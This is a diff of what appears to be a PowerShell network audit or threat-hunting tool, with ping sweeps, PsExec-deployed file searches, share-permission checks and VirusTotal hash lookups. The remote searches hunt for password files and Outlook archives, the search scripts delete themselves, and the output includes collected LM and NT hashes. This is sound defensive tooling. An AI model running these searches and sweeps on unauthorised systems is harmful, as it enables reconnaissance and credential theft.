+                        $IP += $IPOctetInDecimal
+                    }
+
+                #Separate by .
+                $IP = $IP -join "."
+                $IPs += $IP
+            }
+        $IPs
+    }
 }
 
-Function Get-IPRange 
+Function Get-IPRange
 {
 
-        Param( 
-        [Parameter(Mandatory = $true)] 
-        [Array] $Ranges 
-        ) 
-		
-	foreach($Range in $Ranges){ 
- 
-		#Split IP and subnet 
+        Param(
+        [Parameter(Mandatory = $true)]
+        [Array] $Ranges
+        )
+
+	foreach($Range in $Ranges){
+
+		#Split IP and subnet
 		$StartIP = $Range.split("-")[0]
 		$EndIP = $Range.split("-")[1]
 
@@ -1442,24 +1442,24 @@ Function Get-IPRange
 			Return $false
 		}
 	}
-	
+
 	foreach($Range in $Ranges)
-	{ 	
+	{
 		$TempIPArray = $Range.split("-")
 		$TempIPArray = [System.Version[]] ($TempIPArray) | Sort-Object
 		$StartIP = $TempIPArray[0].ToString()
 		$EndIP = $TempIPArray[1].ToString()
-	
+
 		$StartOct1 = [convert]::ToInt32($StartIP.split(".")[0], 10)
 		$StartOct2 = [convert]::ToInt32($StartIP.split(".")[1], 10)
 		$StartOct3 = [convert]::ToInt32($StartIP.split(".")[2], 10)
 		$StartOct4 = [convert]::ToInt32($StartIP.split(".")[3], 10)
-		
+
 		$EndOct1 = [convert]::ToInt32($EndIP.split(".")[0], 10)
 		$EndOct2 = [convert]::ToInt32($EndIP.split(".")[1], 10)
 		$EndOct3 = [convert]::ToInt32($EndIP.split(".")[2], 10)
 		$EndOct4 = [convert]::ToInt32($EndIP.split(".")[3], 10)
-		
+
 		for($i=0; $i -lt 4; $i++)
 		{
 			$num = [convert]::ToInt32($StartIP.split(".")[$i], 10)
@@ -1469,7 +1469,7 @@ Function Get-IPRange
 			}
 		}
 		if($invalid){$invalid=$false; continue}
-		
+
 		for($i=0; $i -lt 4; $i++)
 		{
 			$num = [convert]::ToInt32($EndIP.split(".")[$i], 10)
@@ -1479,23 +1479,23 @@ Function Get-IPRange
 			}
 		}
 		if($invalid){$invalid=$false; continue}
-		
+
 		for($StartOct1; $StartOct1 -le $EndOct1; $StartOct1++){
 			if(-not ($StartOct1 -eq $EndOct1)){
 						$TempEnd2 = 255
-			} 
+			}
 			Else {$TempEnd2 = $EndOct2}
-			
+
 			for($StartOct2; $StartOct2 -le $TempEnd2; $StartOct2++){
 				if(-not (($StartOct2 -eq $EndOct2) -and ($StartOct1 -eq $EndOct1))){
 						$TempEnd3 = 255
-				} 
+				}
 				Else {$TempEnd3 = $EndOct3}
 
 				for($StartOct3; $StartOct3 -le $TempEnd3; $StartOct3++){
 					if(-not (($StartOct3 -eq $EndOct3) -and ($StartOct2 -eq $EndOct2) -and ($StartOct1 -eq $EndOct1))){
 						$TempEnd4 = 255
-					} 
+					}
 					Else {$TempEnd4 = $EndOct4}
 					for($StartOct4; $StartOct4 -le $TempEnd4; $StartOct4++){
 						"$StartOct1.$StartOct2.$StartOct3.$StartOct4"
@@ -1510,17 +1510,17 @@ Function Get-IPRange
 	}
 }
 
-Function Get-IPFile 
+Function Get-IPFile
 {
 
-	Param( 
-	[Parameter(Mandatory = $true)] 
-	[string] $File 
-	) 
-	
+	Param(
+	[Parameter(Mandatory = $true)]
+	[string] $File
+	)
+
 	[Array]$IParray = $null
 	$content = Get-Content $File -ReadCount 0
-	
+
 	foreach($IP in $content)
 	{
 		if($IP|Select-String "-")
@@ -1545,7 +1545,7 @@ Function Get-IPFile
 	Return $ipsort
 }
 
-Function PingSweep 
+Function PingSweep
 {
 	Write-Host -ForegroundColor Green "
 Ping Sweep
@@ -1593,12 +1593,12 @@ Ping Sweep
 Function ExecutePingSweep
 {
 	param($IPList)
-	
+
 	Write-Host
-	
+
 	$Script:Deploy = $false
 	$Script:outfile="PingSweep$script:ScanTime.csv"
-	
+
 	Write-Host $(get-Date)
 	Write-Host -ForegroundColor Yellow "Executing ping sweep"
 	CreateTempDir
@@ -1613,7 +1613,7 @@ Function ChooseFileTypes
 {
 	Write-Host "
 File-types to search.
-    
+
     [0]  ALL
     [1]  Image Files (*.jpg, *.jpeg, *.tif, *.gif, *.bmp)
     [2]  Audio Files (*.m4a, *.m4p, *.mp3, *.wma)
@@ -1622,14 +1622,14 @@ File-types to search.
     [5]  Executable Files (*.exe, *.dll, *.sys)
     [6]  Outlook data files (*.pst)
     [7]  Password files (*passw*, *pwd*)
-		
+
 Choice: " -NoNewLine
 	$ScanChoice = ReadYellow
 	Write-Host
 	Return ParseMenuChoice $ScanChoice 7
 }
 
-Function FileTypeSearch 
+Function FileTypeSearch
 {
 	Write-Host -ForegroundColor Green "
 File Search
@@ -1654,17 +1654,17 @@ File Search
 #deploy file search searches a file path on each local host using psexec
 Function DeployFileSearch
 {
-	$Script:ScanChoiceArray.clear() 
-	
+	$Script:ScanChoiceArray.clear()
+
 	#Array to hold the choices of file-types to search for
 	$FileTypesArray = New-Object System.Collections.ArrayList
 	Write-Host "
-Enter local path to begin search.  
+Enter local path to begin search.
 Default is C:\: " -NoNewLine
 	$Script:PathToSearch = ReadYellow
 	if (-not $Script:PathToSearch){$Script:PathToSearch="C:\"} #default path is C:\
-	$FileTypesArray.add($(ChooseFileTypes))|Out-Null 
-	
+	$FileTypesArray.add($(ChooseFileTypes))|Out-Null
+
 	for($i=0; $i -lt $FileTypesArray.count; $i++)
 	{
 		#set script variables based on file types
@@ -1700,7 +1700,7 @@ Default is C:\: " -NoNewLine
 				echo %COMPUTERNAME%,%%~nxf,%%~dpf
 				) >> "C:\AudioFileSearch392125281"
 				(goto) 2>nul & del "%~f0"'
-				
+
 				$Script:AudioSearchCode_PS1 = '
 				if (Test-Path "C:\AudioFileSearch392125281"){Remove-Item -Force "C:\AudioFileSearch392125281"}
 				$include = "*.m4a", "*.m4p", "*.mp3", "*.wma"
@@ -1710,7 +1710,7 @@ Default is C:\: " -NoNewLine
 				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
 				Out-file "C:\AudioFileSearch392125281"
 				} catch {continue}
-				Remove-Item -Force "C:\PSExecShellCode.ps1"'				
+				Remove-Item -Force "C:\PSExecShellCode.ps1"'
 			}
 			3{
 				$Script:ScanChoiceArray.add(103)|out-null
@@ -1720,8 +1720,8 @@ Default is C:\: " -NoNewLine
 				for /R "'+$PathToSearch+'" %%f in (*.asf *.avi *.m4v *.mov *.mp4 *.mpeg *.mpg *.wmv) do (
 				echo %COMPUTERNAME%,%%~nxf,%%~dpf
 				) >> "C:\VideoFileSearch392125281"
-				(goto) 2>nul & del "%~f0"'	
-				
+				(goto) 2>nul & del "%~f0"'
+
 				$Script:VideoSearchCode_PS1 = '
 				if (Test-Path "C:\VideoFileSearch392125281"){Remove-Item -Force "C:\VideoFileSearch392125281"}
 				$include = "*.asf", "*.avi", "*.m4v", "*.mov", "*.mp4", "*.mpeg", "*.mpg", "*.wmv"
@@ -1731,7 +1731,7 @@ Default is C:\: " -NoNewLine
 				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
 				Out-file "C:\VideoFileSearch392125281"
 				} catch {continue}
-				Remove-Item -Force "C:\PSExecShellCode.ps1"'					
+				Remove-Item -Force "C:\PSExecShellCode.ps1"'
 			}
 			4{
 				$Script:ScanChoiceArray.add(104)|out-null
@@ -1741,8 +1741,8 @@ Default is C:\: " -NoNewLine
 				for /R "'+$PathToSearch+'" %%f in (*.ps1 *.psm1 *.vb *.vbs *.bat *.cmd) do (
 				echo %COMPUTERNAME%,%%~nxf,%%~dpf
 				) >> "C:\ScriptFileSearch392125281"
-				(goto) 2>nul & del "%~f0"'	
-				
+				(goto) 2>nul & del "%~f0"'
+
 				$Script:ScriptSearchCode_PS1 = '
 				if (Test-Path "C:\ScriptFileSearch392125281"){Remove-Item -Force "C:\ScriptFileSearch392125281"}
 				$include = "*.ps1", "*.psm1", "*.vb", "*.vbs", "*.bat", "*.cmd"
@@ -1752,7 +1752,7 @@ Default is C:\: " -NoNewLine
 				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
 				Out-file "C:\ScriptFileSearch392125281"
 				} catch {continue}
-				Remove-Item -Force "C:\PSExecShellCode.ps1"'				
+				Remove-Item -Force "C:\PSExecShellCode.ps1"'
 			}
 			5{
 				$Script:ScanChoiceArray.add(105)|out-null
@@ -1763,7 +1763,7 @@ Default is C:\: " -NoNewLine
 				echo %COMPUTERNAME%,%%~nxf,%%~dpf
 				) >> "C:\ExecutableFileSearch392125281"
 				(goto) 2>nul & del "%~f0"'
-				
+
 				$Script:ExecutableSearchCode_PS1 = '
 				if (Test-Path "C:\ExecutableFileSearch392125281"){Remove-Item -Force "C:\ExecutableFileSearch392125281"}
 				$include = "*.exe", "*.dll", "*.sys"
@@ -1773,7 +1773,7 @@ Default is C:\: " -NoNewLine
 				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
 				Out-file "C:\ExecutableFileSearch392125281"
 				} catch {continue}
-				Remove-Item -Force "C:\PSExecShellCode.ps1"'				
+				Remove-Item -Force "C:\PSExecShellCode.ps1"'
 			}
 			6{
 				$Script:ScanChoiceArray.add(106)|out-null
@@ -1783,8 +1783,8 @@ Default is C:\: " -NoNewLine
 				for /R "'+$PathToSearch+'" %%f in (*.pst) do (
 				echo %COMPUTERNAME%,%%~nxf,%%~dpf
 				) >> "C:\DataFileSearch392125281"
-				(goto) 2>nul & del "%~f0"'	
-				
+				(goto) 2>nul & del "%~f0"'
+
 				$Script:DataFileSearchCode_PS1 = '
 				if (Test-Path "C:\DataFileSearch392125281"){Remove-Item -Force "C:\DataFileSearch392125281"}
 				$include = "*.pst"
@@ -1794,7 +1794,7 @@ Default is C:\: " -NoNewLine
 				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
 				Out-file "C:\DataFileSearch392125281"
 				} catch {continue}
-				Remove-Item -Force "C:\PSExecShellCode.ps1"'					
+				Remove-Item -Force "C:\PSExecShellCode.ps1"'
 			}
 			7{
 				$Script:ScanChoiceArray.add(107)|out-null
@@ -1804,8 +1804,8 @@ Default is C:\: " -NoNewLine
 				for /R "'+$PathToSearch+'" %%f in (*passw* *pwd*) do (
 				echo %COMPUTERNAME%,%%~nxf,%%~dpf
 				) >> "C:\PasswordFileSearch392125281"
-				(goto) 2>nul & del "%~f0"'	
-				
+				(goto) 2>nul & del "%~f0"'
+
 				$Script:PasswordSearchCode_PS1 = '
 				if (Test-Path "C:\PasswordFileSearch392125281"){Remove-Item -Force "C:\PasswordFileSearch392125281"}
 				$include = "*passw*", "*pwd*"
@@ -1815,7 +1815,7 @@ Default is C:\: " -NoNewLine
 				foreach {${env:COMPUTERNAME}+","+$_.Name+","+$_.Directoryname}|
 				Out-file "C:\PasswordFileSearch392125281"
 				} catch {continue}
-				Remove-Item -Force "C:\PSExecShellCode.ps1"'				
+				Remove-Item -Force "C:\PSExecShellCode.ps1"'
 			}
 			"h"{return $false}
 			"home"{return $false}
@@ -1836,11 +1836,11 @@ Function NetShareFileSearch_Run
 		CurrentOperation = $path
 		Status="Querying top level folders"
 		PercentComplete=0
-	} 
-	
-	Write-Progress @progParam 
-	
-	#Get all subdirectories in path to search 
+	}
+
+	Write-Progress @progParam
+
+	#Get all subdirectories in path to search
 	$top = Get-ChildItem -Path $path |Where{$_.PSIsContainer}
 	#initialize a counter
 	$i=0
@@ -1848,20 +1848,20 @@ Function NetShareFileSearch_Run
 		$folder=$folder.FullName
 		#calculate percentage based on number of folders in path to search
 		$i++
-		
+
 		#set variables for progress meter
-		[int]$pct = ($i/$top.count)*100 
+		[int]$pct = ($i/$top.count)*100
 		$progParam.CurrentOperation ="Searching: $folder"
 		$progParam.Status="Progress"
 		$progParam.PercentComplete = $pct
-		
+
 		#Write the progress
-		Write-Progress @progParam 
-		
+		Write-Progress @progParam
+
 		#Perform the file search in the subdirectory of the path
 		Get-ChildItem -path "$folder\*" -Include $include -Recurse -Force -ErrorAction silentlycontinue |
 		foreach {$_.Name+","+$_.Directoryname}
-	}   
+	}
 }
 
 Function NetShareFileSearch
@@ -1871,16 +1871,16 @@ Function NetShareFileSearch
 	{
 		Write-Host "Enter full path to network share: " -NoNewLine
 		$SearchNetworkShare = ReadYellow
-		
-		#Make sure that input is valid.  
-		if ($SearchNetworkShare -and (Test-Path $SearchNetworkShare -ErrorAction SilentlyContinue)) {break}	
-		else 
+
+		#Make sure that input is valid.
+		if ($SearchNetworkShare -and (Test-Path $SearchNetworkShare -ErrorAction SilentlyContinue)) {break}
+		else
 		{
 			Write-Host -ForegroundColor Red "Invalid Path
 Use format: \\servername\sharename"
-		} 
+		}
 	}
-	
+
 	$FileTypesArray.add($(ChooseFileTypes)) #fill array with file types to search
 	$Script:Deploy = $false #Search is not executed using psexec
 
@@ -1907,7 +1907,7 @@ Use format: \\servername\sharename"
 				ConvertFileFormat "$TEMP_DIR\$outfile"
 			}
 			3{  #Video Files
-				$script:outfile = "VideoFiles_Share$script:ScanTime.csv"				
+				$script:outfile = "VideoFiles_Share$script:ScanTime.csv"
 				Write-Host -ForegroundColor Yellow "Searching for video files."
 				"File,Directory" | Add-Content "$TEMP_DIR\$outfile"
 				$include = "*.asf", "*.avi", "*.m4v", "*.mov", "*.mp4", "*.mpeg", "*.mpg", "*.wmv"
@@ -1915,7 +1915,7 @@ Use format: \\servername\sharename"
 				ConvertFileFormat "$TEMP_DIR\$outfile"
 			}
 			4{  #Script Files
-				$script:outfile = "ScriptFiles_Share$script:ScanTime.csv"				
+				$script:outfile = "ScriptFiles_Share$script:ScanTime.csv"
 				Write-Host -ForegroundColor Yellow "Searching for windows script files."
 				"File,Directory" | Add-Content "$TEMP_DIR\$outfile"
 				$include = "*.ps1", "*.psm1", "*.vb", "*.vbs", "*.bat", "*.cmd"
@@ -1923,28 +1923,28 @@ Use format: \\servername\sharename"
 				ConvertFileFormat "$TEMP_DIR\$outfile"
 			}
 			5{ #Executable Files
-				$script:outfile = "ExecutableFiles_Share$script:ScanTime.csv"				
+				$script:outfile = "ExecutableFiles_Share$script:ScanTime.csv"
 				Write-Host -ForegroundColor Yellow "Searching for executable files."
-				"File,Directory" | Add-Content "$TEMP_DIR\$outfile" 
+				"File,Directory" | Add-Content "$TEMP_DIR\$outfile"
 				$include = "*.exe", "*.dll", "*.sys"
 				NetShareFileSearch_Run $SearchNetworkShare $include "Executable Search:" |Add-Content "$TEMP_DIR\$outfile"
 				ConvertFileFormat "$TEMP_DIR\$outfile"
 			}
 			6{  #Outlook data files
-				$script:outfile = "OutlookDataFiles_Share$script:ScanTime.csv"				
+				$script:outfile = "OutlookDataFiles_Share$script:ScanTime.csv"
 				Write-Host -ForegroundColor Yellow "Searching for Outlook data files."
-				"File,Directory" | Add-Content "$TEMP_DIR\$outfile" 
+				"File,Directory" | Add-Content "$TEMP_DIR\$outfile"
 				$include = "*.pst"
 				NetShareFileSearch_Run $SearchNetworkShare $include "Outlook Data-file Search:"  |Add-Content "$TEMP_DIR\$outfile"
 				ConvertFileFormat "$TEMP_DIR\$outfile"
 			}
 			7{  #password files
-				$script:outfile = "PasswordFiles_Share$script:ScanTime.csv"				
+				$script:outfile = "PasswordFiles_Share$script:ScanTime.csv"
 				Write-Host -ForegroundColor Yellow "Searching for password files."
 				"File,Directory" | Add-Content "$TEMP_DIR\$outfile"
 				$include = "*passw*", "*pwd*"
 				NetShareFileSearch_Run $SearchNetworkShare $include "Password Search:" |Add-Content "$TEMP_DIR\$outfile"
-				ConvertFileFormat "$TEMP_DIR\$outfile"			
+				ConvertFileFormat "$TEMP_DIR\$outfile"
 			}
 		}
 	}
@@ -1954,13 +1954,13 @@ Function LoggedOnUsers
 {
 	Write-Host
 	if($script:FirstRunComps) #Test to see if list of active computers exists or not
-	{		
-		$script:ActiveComputers = GetActiveComputers 
+	{
+		$script:ActiveComputers = GetActiveComputers
 	}
-	
+
 	$Script:Deploy = $false
 	$Script:outfile="LoggedOnUsers$script:ScanTime.csv"
-	
+
 	Write-Host $(get-Date)
 	Write-Host -ForegroundColor Yellow "Enumerating logged on users"
 	CreateTempDir
@@ -1971,7 +1971,7 @@ Function LoggedOnUsers
 Function MapDrive
 {
 	param($IPAddress, $ShareName)
-	
+
 	$UserDomain = $scan.Creds.GetNetworkCredential().domain
 	$UserName = $scan.Creds.GetNetworkCredential().username
 	if($userDomain)
@@ -1982,18 +1982,18 @@ Function MapDrive
 	{
 		$UserLogon = "$UserName"
 	}
-			
+
 	net use \\$IPAddress\$ShareName /user:$UserLogon $($scan.Creds.GetNetworkCredential().password) 2>&1|Out-Null
 	if(-not $?)
 	{
-		"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostIP,Can't Map Drive" | 
+		"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostIP,Can't Map Drive" |
 		Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
 		Return $FALSE
 	}
 	Return $TRUE
 }
-			
-Function NetworkSharesPermissions
+
+Function NetworkSharePermissions
 {
 	if(Test-Path $OUT_DIR) #look for network shares data in $OUT_DIR
 	{
@@ -2003,23 +2003,23 @@ Function NetworkSharesPermissions
 			$NetShareFile1 = $(Get-ChildItem "$OUT_DIR\CSV\NetworkShares*.csv" |sort -Property LastWriteTime|select -first 1)
 		}
 	}
-	
+
 	if($NetShareFile) #data found in $OUT_DIR
 	{
 		#Get list of shares but skip column names and $ shares
 		$Shares = (Get-Content $NetShareFile |Select -skip 1|Select-String -SimpleMatch '$' -NotMatch)
 	}
-	
+
 	elseif($NetShareFile1) #data found in $OUT_DIR\CSV
 	{
 		$Shares = (Get-Content $NetShareFile1 |Select -skip 1|Select-String -SimpleMatch '$' -NotMatch)
 	}
-	
+
 	else{Write-Host -ForegroundColor Red "Network-shares file not found"; return}
-	
+
 	(get-Date).ToString() | Write-Host
 	Write-Host -ForegroundColor Yellow "Enumerating network-share permissions"
-	
+
 	if(-not $Shares)
 	{
 		Write-Host -ForegroundColor Red "No network-shares found"
@@ -2028,12 +2028,12 @@ Function NetworkSharesPermissions
 
 	#Create data file
 	"HostName,ShareName,Identity,Permissions,Inherited"|Add-Content "$OUT_DIR\$outfile"
-	
+
 	foreach($Share in $Shares){
 		$HostName = $Share.ToString().split(",")[0]
 		$ShareName = $Share.ToString().split(",")[2]
 		if($scan.creds)
-		{		
+		{
 			If(-not (MapDrive $HostName $ShareName)){Continue}
 		}
 		if(Test-Path "\\$HostName\$ShareName" -ErrorAction SilentlyContinue)
@@ -2061,7 +2061,7 @@ Function NetworkSharesPermissions
 Function SendRequest
 {
 	param($hashBlock, $APIKey)
-	
+
     $par = @{
         Uri = 'https://www.virustotal.com/vtapi/v2/file/report'
         DisableKeepAlive = $true
@@ -2072,15 +2072,15 @@ Function SendRequest
     $par['Body'].resource = $hashBlock
 
     try {
-		$data = Invoke-RestMethod @par 
+		$data = Invoke-RestMethod @par
 	} catch {
 		Write-host -ForegroundColor Red "Virus total web request failed"
 		Return $false
 	}
-	
+
     $data|%{
     $_.resource+","+$_.positives+","+$_.total+","+$_.scan_date+","+$_.permalink}|
-    Add-Content "$TEMP_DIR\$OutFile" 
+    Add-Content "$TEMP_DIR\$OutFile"
 	Return $true
 }
 
@@ -2091,14 +2091,14 @@ Function VTHashAnalysis
 		Write-Host -ForegroundColor Red "Function requires Powershell version 3.0 or higher"
 		Return
 	}
-	
+
 	Write-Host -ForegroundColor Green "
 Virus Total Hash Analysis
 -------------------------"
 	while($true)
 	{
 		Write-Host "Enter proxy IP [none]: " -NoNewLine
-		$proxyIP = ReadYellow 
+		$proxyIP = ReadYellow
 		if($proxyIP)
 		{
 			if(ReturnFunction $proxyIP){Return}
@@ -2107,7 +2107,7 @@ Virus Total Hash Analysis
 				while($true)
 				{
 					Write-Host "Enter proxy port [8080]: " -NoNewLine
-					$proxyPort = ReadYellow 
+					$proxyPort = ReadYellow
 					if(-not $proxyPort){$proxyPort = 8080}
 					elseif(ReturnFunction $proxyPort){Return}
 					if(($proxyPort -lt 65536) -and ($proxyPort -gt 0)){break}
@@ -2162,30 +2162,30 @@ Virus Total Hash Analysis
 	Write-Host "Execute? [Y/n]: " -NoNewLine
 	$Execute = ReadYellow
 	if(($Execute -eq "n") -or ($Execute -eq "N")){Return}
-	
+
 	if(-not (Test-Connection www.virustotal.com -Quiet))
 	{
 		Write-Host -ForegroundColor Red "Cannot reach www.virustotal.com"
 		Return
 	}
-	
+
 	Write-Host
 	Write-Host -ForegroundColor Yellow "Executing Virus-Total hash analysis"
 	$script:outfile = "VT_HashAnalysis$script:ScanTime.csv"
 	"File Hash,Hits,# of AVs,Analysis Date,URL" | Add-Content "$TEMP_DIR\$outfile"
-	
+
 	$progParam=@{
 		Activity = "Virus-Total hash analysis"
 		CurrentOperation = ""
 		Status="Parsing hash file"
 		PercentComplete=0
 	}
-	
+
 	Write-Progress @progParam
-	
+
 	$regex = '\b[0-9a-fA-F]{32}\b'
 	$hashes = select-string -Path $HashFile -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value.tostring() }
-	$hashes = ($hashes|Sort-Object -Unique) 
+	$hashes = ($hashes|Sort-Object -Unique)
 	$hashBlock = ""
 	for($c=0; $c -le $hashes.count; $c+= 25)
 	{
@@ -2197,34 +2197,34 @@ Virus Total Hash Analysis
 		$First=$true
 		$hashes[($c..($c+$BlockSize))] | % {
 			if($First){$hashBlock=$_; $First=$false}
-			else{$hashBlock = $hashBlock+", "+$_} 
+			else{$hashBlock = $hashBlock+", "+$_}
 		}
 		$RequestStatus = SendRequest $hashBlock $APIKey
 		if(-not $RequestStatus){Return}
-		
-		[int]$pct = ($c/$hashes.count)*100 
+
+		[int]$pct = ($c/$hashes.count)*100
 		$progParam.CurrentOperation ="$c/$($hashes.count) hashes processed"
 		$progParam.Status="Progress"
 		$progParam.PercentComplete = $pct
-		Write-Progress @progParam 
-		
+		Write-Progress @progParam
+
 		if($c -eq $hashes.count){Return}
 		sleep 15
 	}
-	ConvertFileFormat "$TEMP_DIR\$outfile" 
+	ConvertFileFormat "$TEMP_DIR\$outfile"
 }
 
 #Run the Scan
-Function Execute 
+Function Execute
 {
 	if (-not $script:ConfigSuccess){$script:ConfigSuccess = config} #scan vars have not been configured enter configuration mode
 	if(-not $script:ConfigSuccess){Return}
-	
+
 	if($script:CompsDate){
 		#refresh list of active computers after 3 hours
 		if($script:CompsDate -lt (Get-Date).AddHours(-3)){$script:FirstRunComps=$true}
 	}
-	
+
 	if(-not ($ScanHostsFile -eq "ALL"))
 	{
 		$ModTime = (Get-ChildItem $ScanHostsFile).LastWriteTime
@@ -2240,20 +2240,20 @@ Function Execute
 	{
 		mkdir -Path $script:OUT_DIR -Force | Out-Null
 	}
-	
+
 	$script:ScanTime = $((get-date).tostring("HHmmss"))
 	CreateTempDir
-	DisplayMenu 
-	
-	
+	DisplayMenu
+
+
 	#continue looping until all scans completed
 	for($i=0; $i -lt $script:ScanChoiceArray.count; $i++)
 	{
 		if (-not (SetScanTypeVars $script:ScanChoiceArray[$i])){continue} #scan choice was invalid. Move to next
-		
+
 		if($script:Deploy)
-		{		
-					
+		{
+
 			if($script:FirstRunComps) #Test to see if list of active computers exists or not
 			{
 				if(-not (Test-Path $TEMP_DIR)){CreateTempDir}
@@ -2275,20 +2275,20 @@ Function Execute
 					Continue
 				}
 			}
-			
+
 			if($ActiveComputers.count -gt 0)
 			{
-		
+
 				if(-not (Test-Path $TEMP_DIR)){CreateTempDir}
-			
+
 				(get-Date).ToString()
 				Write-Host -ForegroundColor Yellow "Performing $ScanType"
-			
+
 				$script:CleanUp = $true
-				
-				#Create error log.  
-				"Time Stamp,Host Name, Error" | Add-Content "$TEMP_DIR\ErrorLog.csv" 
-				
+
+				#Create error log.
+				"Time Stamp,Host Name, Error" | Add-Content "$TEMP_DIR\ErrorLog.csv"
+
 				ExecutePSexec
 				CollectFiles
 
@@ -2299,7 +2299,7 @@ Function Execute
 				}
 				ParseData $script:ScanChoiceArray[$i]
 			}
-			
+
 			else
 			{
 				if (-not $noHosts)
@@ -2323,12 +2323,12 @@ Function Execute
 
 ############################################
 #		END	Scan Functions
-############################################ 
+############################################
 
 
 ############################################
 # START Functions for Deploy/Multi-threading
-############################################ 
+############################################
 
 Function RunScriptBlock #Create multiple threads to do work
 {
@@ -2338,29 +2338,29 @@ Function RunScriptBlock #Create multiple threads to do work
     $RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, $scan.Throttle)
     $RunspacePool.Open()
     $Jobs = @()
-	
+
 	#iterate through hosts and start new powershell job for each host
     $RemoteHosts | % {
-		
+
 		#add the scriptblock and parameters
         $Job = [powershell]::Create().AddScript($ScriptBlock).AddArgument($_).AddArgument($scan)
         $Job.RunspacePool = $RunspacePool
-       
+
         $Jobs += New-Object PSObject -Property @{
             RunNum = $_
             Pipe = $Job
             Result = $Job.BeginInvoke()
         }
     }
-    
+
 	#get results
     $Results = @()
     ForEach ($Job in $Jobs)
-    {   
+    {
         $Results += $Job.Pipe.EndInvoke($Job.Result)
     }
-	
-    $Results 
+
+    $Results
     $RunspacePool.Dispose()
 }
 
@@ -2379,32 +2379,32 @@ Function CollectFiles #Collect results from remote hosts
 	RunScriptBlock $CollectFiles_SB $CollectComputers $scan
 }
 
-Function ParseData 
+Function ParseData
 {
 	param($ScanChoice)
 	Write-Host -ForegroundColor Yellow "Parsing collected data"
-	
+
 	#set variables for different generated files
 	$Results = "$TEMP_DIR\$OutFile"
 	$ResultsUnique = "$TEMP_DIR\Unique.csv"
-	$ResultsFiltered = "$TEMP_DIR\Filtered.csv"	
+	$ResultsFiltered = "$TEMP_DIR\Filtered.csv"
 	$ResultsUniqFilt = "$TEMP_DIR\Filtered_Unique.csv"
 	$Errors = "$TEMP_DIR\ErrorLog.csv"
 
 	#Add column headers to files
-    switch ($ScanChoice) 
+    switch ($ScanChoice)
     {
 		1{"Host Name,Executable,Path" |Add-Content $Results}
 		2{"Host Name,Description,Friendly Name,Location"|Add-Content $Results}
 		3{"Host Name, Disabled"|Add-Content $Results}
         4{"Host Name,Command,Description,Location,User"|Add-Content $Results}
         5{"Host Name,Command,JobId,Name,Owner,Priority"|Add-Content $Results}
-		6{"Host Name,Executable Path,Name" |Add-Content $Results}
+		6{"Host Name,Executable Path,Name,Process ID" |Add-Content $Results}
         7{"Host Name,Description,DisplayName,Name,Started,State,Status" |Add-Content $Results}
         8{"Host Name,Name,StartMode,State,Status" |Add-Content $Results}
         9{"Host Name,Source IP,Source Port,Destination IP,Destination Port,State,Process Name,Process ID"|Add-Content $Results}
 		10{"Host Name,InstallDate,InstallLocation,Name,Vendor,Version" |Add-Content $Results}
-        11{"Host Name,Description,Name,Path" |Add-Content $Results} 
+        11{"Host Name,Description,Name,Path" |Add-Content $Results}
 		13{"Host Name,Display Name,Enabled,UptoDate,Version"|Add-Content $Results}
 		14{"Host Name,Account Name,Account Active,Last Logon"|Add-Content $Results}
 		16{"Host Name,Description,HotFixID,InstalledBy,InstalledOn" |Add-Content $Results}
@@ -2420,8 +2420,8 @@ Function ParseData
 		110{"Host Name,User,RID,LM Hash,NT Hash"|Add-Content $Results}
 		111{"File Name,MD5 Hash"|Add-Content $Results}
 	}
-    
-	#Append each data file to $results.  
+
+	#Append each data file to $results.
     foreach ($file in (Get-ChildItem "$TEMP_DIR\" -Exclude "$OutFile", "ErrorLog.csv", "Scanned_Hosts*.csv" -Name))
     {
 		#wait for file to unlock
@@ -2436,14 +2436,14 @@ Function ParseData
 			}
 		}
     }
-	
+
 	FilterData $ScanChoice
-	
+
     return
 }
 
 #Create a count of unique data
-Function UniqueFilter 
+Function UniqueFilter
 {
 	$data|group|Select count,name|
 		sort -property count -descending|%{
@@ -2453,224 +2453,224 @@ Function UniqueFilter
 Function FilterData
 {
 	param($ScanChoice)
-	
+
 	$Content = Get-Content $Results -ReadCount 0
 	switch($ScanChoice)
 	{
-		1{	
-			$filter = Get-Content $KnownGood.UserExe -ReadCount 0| Where{$_}
-			
+		1{
+			$filter = Get-Content $KnownGood.UserExe | Where{$_}
+
 			#Unique results
 			"Count,Executable"|Add-Content $ResultsUnique
 			$data = ($Content|select -skip 1)|%{$_.split(",")[1]}
 			UniqueFilter | Add-Content $ResultsUnique
-				
+
 			#Filtered Results
 			if($filter)
 			{
 				"Host Name,Executable,Path" |Add-Content $ResultsFiltered
 				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
-				
+
 				#Unique filtered results
-				$data = (Get-Content $ResultsFiltered -ReadCount 0|select -skip 1)|%{$_.split(",")[1]}
+				$data = (Get-Content $ResultsFiltered |select -skip 1)|%{$_.split(",")[1]}
 				if($data)
 				{
 					"Count,Executable"|Add-Content $ResultsUniqFilt
-					UniqueFilter | Add-Content $ResultsUniqFilt	
+					UniqueFilter | Add-Content $ResultsUniqFilt
 				}
 			}
 		}
 		2{
-			$filter = Get-Content $KnownGood.USB -ReadCount 0| Where{$_} 
-			
+			$filter = Get-Content $KnownGood.USB | Where{$_}
+
 			#Unique results
 			"Count,Registry Key"|Add-Content $ResultsUnique
 			$data = ($Content|select -skip 1)|%{$_.split(",")[3]}
 			UniqueFilter | Add-Content $ResultsUnique
-			
+
 			#Filtered Results
 			if($filter)
 			{
 				"Host Name,Description,Friendly Name,Location"|Add-Content $ResultsFiltered
 				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
-				
+
 				#Unique filtered results
-				$data = (Get-Content $ResultsFiltered -ReadCount 0|select -skip 1)|%{$_.split(",")[3]}
+				$data = (Get-Content $ResultsFiltered |select -skip 1)|%{$_.split(",")[3]}
 				if($data)
 				{
 					"Count,Device"|Add-Content $ResultsUniqFilt
